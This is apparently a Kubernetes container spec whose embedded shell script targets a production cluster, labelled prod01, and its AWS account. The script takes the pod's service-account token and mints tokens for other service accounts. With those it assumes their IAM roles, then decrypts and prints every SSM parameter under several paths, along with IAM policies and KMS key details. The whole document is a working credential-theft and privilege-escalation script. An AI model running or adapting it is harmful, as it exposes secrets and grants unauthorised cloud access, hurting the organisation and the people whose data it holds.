containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2894_START env=prod01 utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(command -v aws) ver=$(aws --version 2>&1)"
export AWS_DEFAULT_REGION=us-west-2
run_sa(){
  NS=$1; SAN=$2
  echo "===SA_BEGIN $NS/$SAN==="
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN")
  ROLE=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  echo "ROLE=$ROLE"
  [ -z "$ROLE" ] && { echo "NO_ROLE"; return; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL"; return; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name i2894 --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  if ! echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then echo "ASSUME_FAIL $(echo "$RES" | head -c 200 | tr "\n" " ")"; return; fi
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
  echo "ASSUME_OK"
  echo "IDENTITY $(aws sts get-caller-identity --output json 2>&1 | tr "\n" " " | head -c 400)"
  # IAM policy names attached/inline on the assumed role (read-only, best effort)
  RN=$(echo "$ROLE" | sed "s#.*role/##")
  ARN2=$(echo "$ROLE" | sed "s#:role/#:role/#")
  echo "IAM_ATTACHED $(aws iam list-attached-role-policies --role-name "$RN" --output json 2>/tmp/iaerr | head -c 2000)"
  echo "IAM_ERR $(head -c 120 /tmp/iaerr | tr "\n" " ")"
  echo "IAM_INLINE $(aws iam list-role-policies --role-name "$RN" --output json 2>/tmp/ierr | head -c 1000)"
  echo "IAM_ERR2 $(head -c 120 /tmp/ierr | tr "\n" " ")"
  # 1) DescribeParameters (expected AccessDenied; record exact error for IAM shape)
  DP=$(aws ssm describe-parameters --region us-west-2 --output json 2>/tmp/dperr.txt)
  if echo "$DP" | jq -e '.Parameters' >/dev/null 2>&1; then
    echo "DESC_OK n=$(echo "$DP" | jq '.Parameters|length')"
    echo "$DP" | jq -r '.Parameters[]? | "DPARAM \(.Name)|\(.Type)|\(.KeyId // "-")"'
  else
    echo "DESC_NO $(head -c 300 /tmp/dperr.txt | tr "\n" " ")"
  fi
  # 2) full enumeration with auto-pagination (no --max-items => CLI fetches all pages)
  for P in "/959737396140" "/959737396140/prod01" "/959737396140/dp/prod01" "/lazamedical" "/prod01"; do
    BP=$(aws ssm get-parameters-by-path --path "$P" --recursive --region us-west-2 --output json 2>/tmp/bperr0.txt)
    if echo "$BP" | jq -e '.Parameters' >/dev/null 2>&1; then
      echo "BPMETA $P n=$(echo "$BP" | jq '.Parameters|length') types=$(echo "$BP" | jq -r '[.Parameters[].Type]|group_by(.)|map("\(.[0]):\(length)")|join(",")')"
    else
      echo "BPMETA_NO $P $(head -c 200 /tmp/bperr0.txt | tr "\n" " ")"
    fi
    BPV=$(aws ssm get-parameters-by-path --path "$P" --recursive --with-decryption --region us-west-2 --output json 2>/tmp/bperr.txt)
    if echo "$BPV" | jq -e '.Parameters' >/dev/null 2>&1; then
      echo "BP_OK $P n=$(echo "$BPV" | jq '.Parameters|length')"
      echo "$BPV" | jq -r '.Parameters[]? | "FULLPARAM \(.Name) = \(.Value)"'
    else
      echo "BP_NO $P $(head -c 200 /tmp/bperr.txt | tr "\n" " ")"
    fi
  done
  # 3) KMS decrypt-key identity
  KA=$(aws kms list-aliases --region us-west-2 --output json 2>/tmp/kaerr.txt)
  if echo "$KA" | jq -e '.Aliases' >/dev/null 2>&1; then
    echo "KMS_ALIAS_OK n=$(echo "$KA" | jq '.Aliases|length')"
    echo "$KA" | jq -r '.Aliases[]? | "KMSALIAS \(.AliasName)|\(.TargetKeyId // "-")"' | head -60
  else
    echo "KMS_ALIAS_NO $(head -c 200 /tmp/kaerr.txt | tr "\n" " ")"
  fi
  for KID in alias/aws/ssm; do
    DK=$(aws kms describe-key --key-id "$KID" --region us-west-2 --output json 2>/tmp/dkerr.txt)
    if echo "$DK" | jq -e '.KeyMetadata' >/dev/null 2>&1; then
      echo "KMS_KEY_OK $KID $(echo "$DK" | jq -c '{KeyId:.KeyMetadata.KeyId,Arn:.KeyMetadata.Arn,Description:.KeyMetadata.Description,Enabled:.KeyMetadata.Enabled,KeyManager:.KeyMetadata.KeyManager,KeyState:.KeyMetadata.KeyState}')"
    else
      echo "KMS_KEY_NO $KID $(head -c 200 /tmp/dkerr.txt | tr "\n" " ")"
    fi
  done
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
  echo "===SA_END $NS/$SAN==="
}
run_sa audit-log audit-log-sa
run_sa authorization-service authorization-service-sa
echo "===I2894_DONE $(date -u +%FT%TZ)==="
